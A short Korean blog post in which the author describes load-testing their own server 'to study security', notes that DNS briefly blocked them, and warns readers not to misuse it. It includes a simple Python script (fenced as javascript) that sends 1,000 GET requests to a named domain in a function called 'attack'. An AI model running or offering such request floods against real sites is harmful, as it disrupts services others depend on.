보안 공부좀 할겸 해서 내 서버를 때려봤다.  
순간적으로 뻑가긴 하는데 DNS에서 잠깐 블럭을 걸어버리는 것 같다.  
혹시라도 악용하지는 말것  

```javascript
import requests

url = "http://animalpictures.ga/"

def attack():   
    print('status {}'.format(requests.get(url).status_code))

for i in range(1, 1000):   
    attack()

print('exit')
```
